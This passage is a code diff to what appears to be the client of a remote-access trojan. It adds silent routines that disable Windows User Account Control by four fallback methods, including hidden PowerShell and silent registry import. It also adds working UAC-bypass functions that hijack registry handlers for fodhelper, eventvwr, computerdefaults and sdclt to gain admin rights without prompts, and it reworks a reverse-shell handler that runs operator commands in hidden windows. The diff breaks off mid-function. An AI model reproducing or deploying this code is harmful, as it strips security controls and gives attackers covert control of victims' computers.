@@ -4661,48 +4661,660 @@ def disable_wsl_routing():
         log_message(f"[WSL] Error disabling WSL routing: {e}")
         return False
 
-def disable_uac():
-    """Disable UAC (User Account Control) by modifying registry settings."""
+def verify_uac_status():
+    """Verify current UAC status and return detailed info."""
     if not WINDOWS_AVAILABLE:
-        log_message("[REGISTRY] Windows not available for UAC disable")
-        return False
+        return None
     
     try:
         import winreg
-        
         reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-        log_message(f"[REGISTRY] Attempting to open UAC registry key: HKLM\\{reg_path}")
         
-        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 1, winreg.KEY_SET_VALUE) as key:
-            log_message("[REGISTRY] UAC registry key opened successfully")
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_READ) as key:
+            enable_lua = winreg.QueryValueEx(key, "EnableLUA")[0]
+            consent_prompt = winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")[0]
+            secure_desktop = winreg.QueryValueEx(key, "PromptOnSecureDesktop")[0]
             
-            # Set EnableLUA to 0 (disable UAC)
-            log_message("[REGISTRY] Setting EnableLUA = 0 (disabling UAC)")
-            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
-            log_message("[REGISTRY] EnableLUA set successfully")
-            
-            # Set ConsentPromptBehaviorAdmin to 0 (no password prompts for administrators)
-            # Changed from 1 to 0 to prevent password popup
-            log_message("[REGISTRY] Setting ConsentPromptBehaviorAdmin = 0 (no password prompt)")
-            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
-            log_message("[REGISTRY] ConsentPromptBehaviorAdmin set successfully")
-            
-            # Set PromptOnSecureDesktop to 0 (disable secure desktop)
-            log_message("[REGISTRY] Setting PromptOnSecureDesktop = 0 (disabling secure desktop)")
-            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
-            log_message("[REGISTRY] PromptOnSecureDesktop set successfully")
-            
-        log_message("[REGISTRY] UAC has been disabled successfully.")
-        return True
-    except PermissionError:
-        log_message("[REGISTRY] Access denied. Administrator privileges required for UAC disable.")
-        return False
-    except (OSError, FileNotFoundError):
-        log_message("[REGISTRY] Registry access failed - key not found.")
-        return False
+        status = {
+            'EnableLUA': enable_lua,
+            'ConsentPromptBehaviorAdmin': consent_prompt,
+            'PromptOnSecureDesktop': secure_desktop,
+            'is_disabled': (enable_lua == 0),
+            'requires_password': (consent_prompt == 1),
+            'is_fully_disabled': (enable_lua == 0 and consent_prompt == 0)
+        }
+        
+        debug_print("=" * 80)
+        debug_print("[UAC VERIFY] Current UAC Status:")
+        debug_print(f"  EnableLUA: {enable_lua} (0=Disabled, 1=Enabled)")
+        debug_print(f"  ConsentPromptBehaviorAdmin: {consent_prompt}")
+        debug_print(f"    0 = No prompts (DISABLED)")
+        debug_print(f"    1 = Password required (STRICT)")
+        debug_print(f"    5 = Just click Yes (CONSENT)")
+        debug_print(f"  PromptOnSecureDesktop: {secure_desktop} (0=Off, 1=On)")
+        
+        if status['is_fully_disabled']:
+            debug_print("  ✅ STATUS: UAC FULLY DISABLED - No admin password popups!")
+        elif enable_lua == 0:
+            debug_print("  🟡 STATUS: UAC Disabled but ConsentPromptBehaviorAdmin not 0")
+        elif consent_prompt == 1:
+            debug_print("  🔴 STATUS: STRICT MODE - Password required for all admin actions")
+        else:
+            debug_print(f"  ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin={consent_prompt})")
+        debug_print("=" * 80)
+        
+        return status
     except Exception as e:
-        log_message(f"[REGISTRY] Error disabling UAC: {e}")
+        debug_print(f"[UAC VERIFY] Error checking UAC status: {e}")
+        return None
+
+def silent_disable_uac_method1():
+    """Method 1: Direct registry modification (Python winreg)."""
+    debug_print("[UAC DISABLE] Method 1: Direct registry modification...")
+    try:
+        import winreg
+        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
+            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
+            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
+        
+        debug_print("✅ [UAC DISABLE] Method 1 SUCCESS!")
+        return True
+    except Exception as e:
+        debug_print(f"❌ [UAC DISABLE] Method 1 FAILED: {e}")
         return False
+
+def silent_disable_uac_method2():
+    """Method 2: reg.exe command (silent)."""
+    debug_print("[UAC DISABLE] Method 2: reg.exe command...")
+    try:
+        import subprocess
+        
+        commands = [
+            ['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
+             '/v', 'EnableLUA', '/t', 'REG_DWORD', '/d', '0', '/f'],
+            ['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
+             '/v', 'ConsentPromptBehaviorAdmin', '/t', 'REG_DWORD', '/d', '0', '/f'],
+            ['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
+             '/v', 'PromptOnSecureDesktop', '/t', 'REG_DWORD', '/d', '0', '/f']
+        ]
+        
+        for cmd in commands:
+            subprocess.run(cmd, 
+                         creationflags=subprocess.CREATE_NO_WINDOW,
+                         stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL,
+                         timeout=10)
+        
+        debug_print("✅ [UAC DISABLE] Method 2 SUCCESS!")
+        return True
+    except Exception as e:
+        debug_print(f"❌ [UAC DISABLE] Method 2 FAILED: {e}")
+        return False
+
+def silent_disable_uac_method3():
+    """Method 3: PowerShell Set-ItemProperty (silent)."""
+    debug_print("[UAC DISABLE] Method 3: PowerShell...")
+    try:
+        import subprocess
+        
+        ps_commands = [
+            "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'EnableLUA' -Value 0 -ErrorAction SilentlyContinue",
+            "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -ErrorAction SilentlyContinue",
+            "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'PromptOnSecureDesktop' -Value 0 -ErrorAction SilentlyContinue"
+        ]
+        
+        for cmd in ps_commands:
+            subprocess.run([
+                'powershell.exe', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', 
+                '-Command', cmd
+            ],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=15)
+        
+        debug_print("✅ [UAC DISABLE] Method 3 SUCCESS!")
+        return True
+    except Exception as e:
+        debug_print(f"❌ [UAC DISABLE] Method 3 FAILED: {e}")
+        return False
+
+def silent_disable_uac_method4():
+    """Method 4: Registry file import (no file creation - inline)."""
+    debug_print("[UAC DISABLE] Method 4: Registry import...")
+    try:
+        import subprocess
+        import tempfile
+        import os
+        
+        reg_content = '''Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]
+"EnableLUA"=dword:00000000
+"ConsentPromptBehaviorAdmin"=dword:00000000
+"PromptOnSecureDesktop"=dword:00000000
+'''
+        
+        # Create temporary reg file
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.reg', delete=False) as f:
+            reg_file = f.name
+            f.write(reg_content)
+        
+        # Import silently
+        subprocess.run(['regedit.exe', '/s', reg_file],
+                      creationflags=subprocess.CREATE_NO_WINDOW,
+                      stdout=subprocess.DEVNULL,
+                      stderr=subprocess.DEVNULL,
+                      timeout=10)
+        
+        # Delete temp file
+        try:
+            os.remove(reg_file)
+        except:
+            pass
+        
+        debug_print("✅ [UAC DISABLE] Method 4 SUCCESS!")
+        return True
+    except Exception as e:
+        debug_print(f"❌ [UAC DISABLE] Method 4 FAILED: {e}")
+        return False
+
+def bootstrap_uac_disable_no_admin():
+    """
+    BOOTSTRAP METHOD: Disable UAC WITHOUT needing admin privileges!
+    
+    Strategy:
+    1. Use UAC bypass techniques (fodhelper, eventvwr, etc.) to gain admin
+    2. The elevated process then disables UAC permanently
+    3. All happens automatically with ZERO password prompts!
+    
+    This works from a STANDARD USER account!
+    """
+    if not WINDOWS_AVAILABLE:
+        debug_print("[BOOTSTRAP] Not Windows - skipping")
+        return False
+    
+    debug_print("=" * 80)
+    debug_print("[BOOTSTRAP] UAC DISABLE WITHOUT ADMIN PRIVILEGES!")
+    debug_print("[BOOTSTRAP] Using UAC bypass to gain admin, then disable UAC")
+    debug_print("=" * 80)
+    
+    # Check if already admin
+    if is_admin():
+        debug_print("[BOOTSTRAP] Already admin - proceeding directly to UAC disable")
+        return silent_disable_uac()
+    
+    # Not admin - use UAC bypass to elevate
+    debug_print("[BOOTSTRAP] Not admin - using UAC bypass methods to elevate...")
+    debug_print("[BOOTSTRAP] This works WITHOUT password from standard user account!")
+    
+    # Create a script that will run elevated and disable UAC
+    disable_uac_script = f'''
+import sys
+import os
+
+# Add parent directory to path to import from client.py
+sys.path.insert(0, r"{os.path.dirname(os.path.abspath(__file__))}")
+
+# Set environment flag to indicate we're in elevated mode
+os.environ['ELEVATED_MODE'] = '1'
+
+try:
+    # Import and run UAC disable
+    import client
+    result = client.silent_disable_uac()
+    
+    if result:
+        print("\\n[ELEVATED] UAC disabled successfully!")
+        print("[ELEVATED] Restart required for changes to take effect")
+    else:
+        print("\\n[ELEVATED] UAC disable failed")
+    
+    # Exit elevated process
+    sys.exit(0 if result else 1)
+except Exception as e:
+    print(f"[ELEVATED] Error: {{e}}")
+    import traceback
+    traceback.print_exc()
+    sys.exit(1)
+'''
+    
+    # Save script to temp location
+    import tempfile
+    script_path = os.path.join(tempfile.gettempdir(), "uac_disable_elevated.py")
+    
+    try:
+        with open(script_path, 'w') as f:
+            f.write(disable_uac_script)
+        debug_print(f"[BOOTSTRAP] Created elevation script: {script_path}")
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] Failed to create script: {e}")
+        return False
+    
+    # Try UAC bypass methods to run the script elevated
+    debug_print("\n[BOOTSTRAP] Attempting UAC bypass methods...")
+    
+    # Use the UAC Manager to try all bypass methods
+    try:
+        manager = get_uac_manager()
+        debug_print(f"[BOOTSTRAP] UAC Manager loaded with {len(manager.methods)} methods")
+        
+        # Temporarily modify the executable path to run our script
+        original_file = __file__
+        
+        # Try each bypass method with our elevation script
+        for method_name in manager.get_available_methods():
+            try:
+                debug_print(f"\n[BOOTSTRAP] Trying UAC bypass: {method_name}")
+                method = manager.methods[method_name]
+                
+                # Get the method's executable command
+                elevated_cmd = f'python.exe "{script_path}"'
+                
+                # Execute the bypass with our script
+                if method_name == 'fodhelper':
+                    result = bootstrap_fodhelper_bypass(elevated_cmd)
+                elif method_name == 'eventvwr':
+                    result = bootstrap_eventvwr_bypass(elevated_cmd)
+                elif method_name == 'computerdefaults':
+                    result = bootstrap_computerdefaults_bypass(elevated_cmd)
+                elif method_name == 'sdclt':
+                    result = bootstrap_sdclt_bypass(elevated_cmd)
+                else:
+                    continue
+                
+                if result:
+                    debug_print(f"[BOOTSTRAP] ✅ UAC bypass '{method_name}' succeeded!")
+                    debug_print("[BOOTSTRAP] Elevated process should now be disabling UAC...")
+                    time.sleep(5)  # Wait for elevated process
+                    
+                    # Check if UAC was disabled
+                    status = verify_uac_status()
+                    if status and status['is_fully_disabled']:
+                        debug_print("=" * 80)
+                        debug_print("✅✅✅ [BOOTSTRAP] SUCCESS!")
+                        debug_print("✅ UAC disabled WITHOUT needing admin password!")
+                        debug_print("✅ All done from standard user account!")
+                        debug_print("=" * 80)
+                        
+                        # Cleanup
+                        try:
+                            os.remove(script_path)
+                        except:
+                            pass
+                        
+                        return True
+                
+            except Exception as e:
+                debug_print(f"[BOOTSTRAP] Method '{method_name}' failed: {e}")
+                continue
+        
+        debug_print("[BOOTSTRAP] All UAC bypass methods failed")
+        
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] UAC Manager error: {e}")
+    
+    # Cleanup
+    try:
+        os.remove(script_path)
+    except:
+        pass
+    
+    debug_print("=" * 80)
+    debug_print("❌ [BOOTSTRAP] Could not gain admin via UAC bypass")
+    debug_print("❌ Falling back to standard UAC disable (requires admin)")
+    debug_print("=" * 80)
+    
+    # Fallback to regular method
+    return silent_disable_uac()
+
+def bootstrap_fodhelper_bypass(command):
+    """Bootstrap UAC bypass using fodhelper.exe"""
+    try:
+        import winreg
+        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+        
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        # Execute fodhelper
+        subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"],
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        time.sleep(3)
+        
+        # Cleanup
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except:
+            pass
+        
+        return True
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] Fodhelper bypass error: {e}")
+        return False
+
+def bootstrap_eventvwr_bypass(command):
+    """Bootstrap UAC bypass using eventvwr.exe"""
+    try:
+        import winreg
+        key_path = r"Software\Classes\mscfile\shell\open\command"
+        
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
+        winreg.CloseKey(key)
+        
+        # Execute eventvwr
+        subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"],
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        time.sleep(3)
+        
+        # Cleanup
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except:
+            pass
+        
+        return True
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] EventVwr bypass error: {e}")
+        return False
+
+def bootstrap_computerdefaults_bypass(command):
+    """Bootstrap UAC bypass using computerdefaults.exe"""
+    try:
+        import winreg
+        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+        
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        # Execute computerdefaults
+        subprocess.Popen([r"C:\Windows\System32\ComputerDefaults.exe"],
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        time.sleep(3)
+        
+        # Cleanup
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except:
+            pass
+        
+        return True
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] ComputerDefaults bypass error: {e}")
+        return False
+
+def bootstrap_sdclt_bypass(command):
+    """Bootstrap UAC bypass using sdclt.exe"""
+    try:
+        import winreg
+        key_path = r"Software\Classes\Folder\shell\open\command"
+        
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        # Execute sdclt
+        subprocess.Popen([r"C:\Windows\System32\sdclt.exe"],
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        time.sleep(3)
+        
+        # Cleanup
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except:
+            pass
+        
+        return True
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] Sdclt bypass error: {e}")
+        return False
+
+def silent_disable_uac():
+    """
+    Silently disable UAC with ZERO popups - tries all methods until success.
+    This COMPLETELY removes admin password requirement for ALL exe/installers!
+    """
+    if not WINDOWS_AVAILABLE:
+        debug_print("[UAC DISABLE] Not Windows - skipping")
+        return False
+    
+    debug_print("=" * 80)
+    debug_print("[UAC DISABLE] STARTING SILENT UAC DISABLE")
+    debug_print("[UAC DISABLE] This will DISABLE admin password popups for ALL applications!")
+    debug_print("=" * 80)
+    
+    # Check current status first
+    initial_status = verify_uac_status()
+    if initial_status and initial_status['is_fully_disabled']:
+        debug_print("[UAC DISABLE] ✅ UAC already fully disabled - no action needed!")
+        return True
+    
+    # Try all methods in sequence
+    methods = [
+        silent_disable_uac_method1,
+        silent_disable_uac_method2,
+        silent_disable_uac_method3,
+        silent_disable_uac_method4
+    ]
+    
+    success = False
+    for i, method in enumerate(methods, 1):
+        debug_print(f"\n[UAC DISABLE] Trying method {i}/{len(methods)}...")
+        try:
+            if method():
+                success = True
+                debug_print(f"[UAC DISABLE] Method {i} succeeded! Verifying...")
+                break
+        except Exception as e:
+            debug_print(f"[UAC DISABLE] Method {i} exception: {e}")
+            continue
+    
+    # Verify final status
+    debug_print("\n[UAC DISABLE] Verifying final status...")
+    final_status = verify_uac_status()
+    
+    if final_status and final_status['is_fully_disabled']:
+        debug_print("=" * 80)
+        debug_print("✅✅✅ [UAC DISABLE] SUCCESS!")
+        debug_print("✅ Admin password popups are NOW DISABLED for ALL applications!")
+        debug_print("✅ All .exe and installers will run without password prompts!")
+        debug_print("✅ RESTART REQUIRED for changes to take full effect!")
+        debug_print("=" * 80)
+        return True
+    else:
+        debug_print("=" * 80)
+        debug_print("❌❌❌ [UAC DISABLE] FAILED!")
+        debug_print("❌ Could not disable UAC with any method")
+        debug_print("❌ May need administrator privileges")
+        debug_print("=" * 80)
+        return False
+
+def silent_enable_strict_uac():
+    """
+    Silently enable STRICT UAC - requires admin password for ALL exe/installers.
+    This makes Windows ask for password on EVERY admin action!
+    """
+    if not WINDOWS_AVAILABLE:
+        debug_print("[UAC ENABLE] Not Windows - skipping")
+        return False
+    
+    debug_print("=" * 80)
+    debug_print("[UAC ENABLE] STARTING STRICT UAC ENABLE")
+    debug_print("[UAC ENABLE] This will REQUIRE admin password for ALL applications!")
+    debug_print("=" * 80)
+    
+    # Check current status
+    initial_status = verify_uac_status()
+    if initial_status and initial_status['requires_password']:
+        debug_print("[UAC ENABLE] ✅ UAC already in strict mode - no action needed!")
+        return True
+    
+    # Try multiple methods
+    success = False
+    
+    # Method 1: Direct registry
+    debug_print("[UAC ENABLE] Method 1: Direct registry modification...")
+    try:
+        import winreg
+        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)
+            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 1)
+            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 1)
+        
+        debug_print("✅ [UAC ENABLE] Method 1 SUCCESS!")
+        success = True
+    except Exception as e:
+        debug_print(f"❌ [UAC ENABLE] Method 1 FAILED: {e}")
+        
+        # Method 2: PowerShell fallback
+        debug_print("[UAC ENABLE] Method 2: PowerShell fallback...")
+        try:
+            import subprocess
+            ps_cmd = """
+            Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'EnableLUA' -Value 1 -ErrorAction SilentlyContinue
+            Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorAdmin' -Value 1 -ErrorAction SilentlyContinue
+            Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'PromptOnSecureDesktop' -Value 1 -ErrorAction SilentlyContinue
+            """
+            subprocess.run(['powershell.exe', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
+                         creationflags=subprocess.CREATE_NO_WINDOW,
+                         stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL,
+                         timeout=15)
+            debug_print("✅ [UAC ENABLE] Method 2 SUCCESS!")
+            success = True
+        except Exception as e2:
+            debug_print(f"❌ [UAC ENABLE] Method 2 FAILED: {e2}")
+    
+    # Verify final status
+    debug_print("\n[UAC ENABLE] Verifying final status...")
+    final_status = verify_uac_status()
+    
+    if final_status and final_status['requires_password']:
+        debug_print("=" * 80)
+        debug_print("✅✅✅ [UAC ENABLE] SUCCESS!")
+        debug_print("✅ Admin password is NOW REQUIRED for ALL applications!")
+        debug_print("✅ All .exe and installers will ask for password!")
+        debug_print("✅ RESTART REQUIRED for changes to take full effect!")
+        debug_print("=" * 80)
+        return True
+    else:
+        debug_print("=" * 80)
+        debug_print("❌❌❌ [UAC ENABLE] FAILED!")
+        debug_print("❌ Could not enable strict UAC")
+        debug_print("=" * 80)
+        return False
+
+def disable_uac():
+    """Disable UAC (User Account Control) by modifying registry settings."""
+    # Try bootstrap method first (works without admin!)
+    if not is_admin():
+        debug_print("[UAC] Not admin - using bootstrap method (no password needed)")
+        return bootstrap_uac_disable_no_admin()
+    else:
+        debug_print("[UAC] Already admin - using direct method")
+        return silent_disable_uac()
+
+def toggle_uac(enable=False):
+    """
+    Toggle UAC on or off with full debugging.
+    
+    Args:
+        enable: True to ENABLE strict UAC (password required)
+                False to DISABLE UAC (no password required)
+    """
+    if not WINDOWS_AVAILABLE:
+        print("Not Windows - UAC toggle not available")
+        return False
+    
+    print("\n" + "=" * 80)
+    if enable:
+        print("ENABLING STRICT UAC (Password will be required for all admin actions)")
+    else:
+        print("DISABLING UAC (No password required for admin actions)")
+    print("=" * 80)
+    
+    # Show current status
+    print("\nCURRENT STATUS:")
+    verify_uac_status()
+    
+    # Execute change
+    print("\nAPPLYING CHANGES...")
+    if enable:
+        result = silent_enable_strict_uac()
+    else:
+        result = silent_disable_uac()
+    
+    # Show final status
+    print("\nFINAL STATUS:")
+    verify_uac_status()
+    
+    if result:
+        print("\n" + "=" * 80)
+        print("✅ SUCCESS! Changes applied successfully!")
+        print("⚠️ RESTART REQUIRED for changes to take full effect!")
+        print("=" * 80)
+    else:
+        print("\n" + "=" * 80)
+        print("❌ FAILED! Could not apply changes")
+        print("Make sure you're running as Administrator")
+        print("=" * 80)
+    
+    return result
+
+def test_uac_control():
+    """Test UAC control functions interactively."""
+    if not WINDOWS_AVAILABLE:
+        print("Not Windows - UAC control not available")
+        return
+    
+    print("\n" + "=" * 80)
+    print("UAC CONTROL TEST - INTERACTIVE MODE")
+    print("=" * 80)
+    
+    # Show current status
+    print("\nCURRENT UAC STATUS:")
+    status = verify_uac_status()
+    
+    if not status:
+        print("❌ Could not read UAC status - may need admin privileges")
+        return
+    
+    print("\n\nOPTIONS:")
+    print("1. DISABLE UAC (no password required for any exe/installer)")
+    print("2. ENABLE STRICT UAC (password required for all exe/installers)")
+    print("3. Check status only")
+    print("4. Exit")
+    
+    choice = input("\nEnter choice (1-4): ").strip()
+    
+    if choice == "1":
+        print("\n🔓 DISABLING UAC - No more password prompts!")
+        toggle_uac(enable=False)
+    elif choice == "2":
+        print("\n🔒 ENABLING STRICT UAC - Password will be required!")
+        toggle_uac(enable=True)
+    elif choice == "3":
+        print("\n📊 Current status shown above")
+    else:
+        print("\nExiting...")
+    
+    print("\nTest complete!")
+
 def run_as_admin():
     """Relaunch the script with elevated privileges if not already admin."""
     if not WINDOWS_AVAILABLE:
@@ -6841,34 +7453,65 @@ def reverse_shell_handler(agent_id):
                     # Execute regular command
                     try:
                         if WINDOWS_AVAILABLE:
-                            # Fix PowerShell execution - use proper command formatting
-                            if command.strip().lower().startswith('powershell'):
-                                # If it's already a PowerShell command, execute directly
+                            # Get CMD.exe path
+                            cmd_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cmd.exe')
+                            
+                            # Check if it's a PowerShell command
+                            powershell_indicators = ['Get-', 'Set-', 'New-', 'Remove-', 'Start-', 'Stop-', '$']
+                            is_powershell = any(indicator in command for indicator in powershell_indicators)
+                            
+                            if is_powershell or command.strip().lower().startswith('powershell'):
+                                # Use PowerShell with proper formatting
+                                ps_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
+                                                          'WindowsPowerShell', 'v1.0', 'powershell.exe')
+                                
+                                # Add Out-String -Width 200 to preserve formatting
+                                if '| Out-String' not in command:
+                                    formatted_command = f"{command} | Out-String -Width 200"
+                                else:
+                                    formatted_command = command
+                                
                                 result = subprocess.run(
-                                    ["powershell.exe", "-NoProfile", "-Command", command],
+                                    [ps_exe_path, "-NoProfile", "-Command", formatted_command],
                                     capture_output=True,
-                                    text=True,
+                                    text=False,  # Get bytes for proper encoding
                                     timeout=30,
                                     creationflags=subprocess.CREATE_NO_WINDOW
                                 )
                             else:
-                                # For regular commands, wrap in PowerShell properly
+                                # Use CMD.exe with proper encoding
                                 result = subprocess.run(
-                                    ["powershell.exe", "-NoProfile", "-Command", f"& {{{command}}}"],
+                                    [cmd_exe_path, "/c", "chcp 65001 >nul & " + command],
                                     capture_output=True,
-                                    text=True,
+                                    text=False,  # Get bytes for proper encoding
                                     timeout=30,
                                     creationflags=subprocess.CREATE_NO_WINDOW
                                 )
+                            
+                            # Decode output properly
+                            try:
+                                stdout = result.stdout.decode('utf-8', errors='replace')
+                                stderr = result.stderr.decode('utf-8', errors='replace')
+                            except:
+                                try:
+                                    stdout = result.stdout.decode('cp437', errors='replace')
+                                    stderr = result.stderr.decode('cp437', errors='replace')
+                                except:
+                                    stdout = result.stdout.decode('cp1252', errors='replace')
+                                    stderr = result.stderr.decode('cp1252', errors='replace')
+                            
+                            response = stdout + stderr
                         else:
+                            # Linux/Unix
                             result = subprocess.run(
                                 ["bash", "-c", command],
                                 capture_output=True,
                                 text=True,
                                 timeout=30
                             )
-                        response = result.stdout + result.stderr
-                        if not response:
+                            response = result.stdout + result.stderr
+                        
+                        if not response or not response.strip():
                             response = "[Command executed successfully - no output]\n"
                     except subprocess.TimeoutExpired:
                         response = "[Command timed out after 30 seconds]\n"
@@ -7986,8 +8629,21 @@ def handle_live_audio(command_parts):
         return "Live audio processed successfully"
     except Exception as e:
         return f"Live audio processing failed: {e}"
+def format_command_output(output):
+    """
+    Format command output to preserve alignment and spacing.
+    Wraps output in <pre> tags for proper monospace display.
+    """
+    if not output:
+        return output
+    
+    # Wrap in <pre> tag to preserve formatting in HTML
+    # This ensures columns stay aligned in web interface
+    formatted = f"<pre style='font-family: Consolas, Monaco, \"Courier New\", monospace; white-space: pre; overflow-x: auto;'>{output}</pre>"
+    return formatted
+
 def execute_command(command):
-    """Execute a command and return its output - SMART AUTO-DETECTION"""
+    """Execute a command and return its output - SMART AUTO-DETECTION with PRESERVED FORMATTING"""
     try:
         log_message(f"[CMD] Executing: {command}", "info")
         
@@ -8072,30 +8728,74 @@ def execute_command(command):
                 # Use PowerShell for PowerShell-specific commands
                 log_message(f"[CMD] Using PowerShell: {ps_exe_path}", "debug")
                 
+                # PowerShell with proper output formatting
+                # Add Out-String -Width 200 to preserve formatting
+                formatted_command = f"{command} | Out-String -Width 200"
+                
                 result = subprocess.run(
-                    [ps_exe_path, "-NoProfile", "-NonInteractive", "-Command", command],
+                    [ps_exe_path, "-NoProfile", "-NonInteractive", "-Command", formatted_command],
                     capture_output=True,
-                    text=True,
-                    encoding='utf-8',  # ✅ Force UTF-8 encoding
-                    errors='replace',  # ✅ Replace invalid characters instead of crashing
+                    text=False,  # Get bytes first for proper encoding detection
                     timeout=30,
                     creationflags=subprocess.CREATE_NO_WINDOW,
                     env=os.environ.copy()
                 )
+                
+                # Decode with proper Windows console encoding
+                try:
+                    # Try UTF-8 first
+                    stdout = result.stdout.decode('utf-8', errors='replace')
+                    stderr = result.stderr.decode('utf-8', errors='replace')
+                except:
+                    # Fallback to Windows default encoding (cp1252 or cp437)
+                    import locale
+                    encoding = locale.getpreferredencoding() or 'cp437'
+                    stdout = result.stdout.decode(encoding, errors='replace')
+                    stderr = result.stderr.decode(encoding, errors='replace')
+                
+                # Create result-like object
+                class Result:
+                    pass
+                result = Result()
+                result.stdout = stdout
+                result.stderr = stderr
+                
             else:
                 # Use CMD.exe for standard/translated commands
                 log_message(f"[CMD] Using CMD.exe: {cmd_exe_path}", "debug")
                 
+                # For CMD, capture bytes first for proper encoding
                 result = subprocess.run(
-                    [cmd_exe_path, "/c", command],
+                    [cmd_exe_path, "/c", "chcp 65001 >nul & " + command],  # Force UTF-8 output
                     capture_output=True,
-                    text=True,
-                    encoding='utf-8',  # ✅ Force UTF-8 encoding
-                    errors='replace',  # ✅ Replace invalid characters instead of crashing
+                    text=False,  # Get bytes first
                     timeout=30,
                     creationflags=subprocess.CREATE_NO_WINDOW,
                     env=os.environ.copy()
                 )
+                
+                # Decode with proper encoding
+                try:
+                    # Try UTF-8 (after chcp 65001)
+                    stdout = result.stdout.decode('utf-8', errors='replace')
+                    stderr = result.stderr.decode('utf-8', errors='replace')
+                except:
+                    # Fallback to Windows console encoding
+                    try:
+                        # Try cp437 (US English console)
+                        stdout = result.stdout.decode('cp437', errors='replace')
+                        stderr = result.stderr.decode('cp437', errors='replace')
+                    except:
+                        # Final fallback to cp1252 (Windows default)
+                        stdout = result.stdout.decode('cp1252', errors='replace')
